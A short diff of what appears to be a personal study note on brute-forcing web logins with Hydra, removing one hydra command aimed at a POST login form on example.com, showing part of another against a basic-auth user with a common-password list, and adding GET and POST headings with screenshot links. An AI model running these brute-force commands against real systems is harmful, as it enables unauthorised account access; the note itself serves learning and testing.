@@ -1,9 +1,6 @@
 ___
 
-```bash
-hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
-```
-
+# GET
 
 ![[Pasted image 20241004131226.png]]
 
@@ -18,6 +15,10 @@ hydra -l basic-auth-user -P /usr/share/seclists/Passwords/2023-200_most_used_pas
 ![[Pasted image 20241004131840.png]]
 
 ![[Pasted image 20241004132934.png]]
+
+# POST
+
+![[Pasted image 20241004134542.png]]
 
 
 
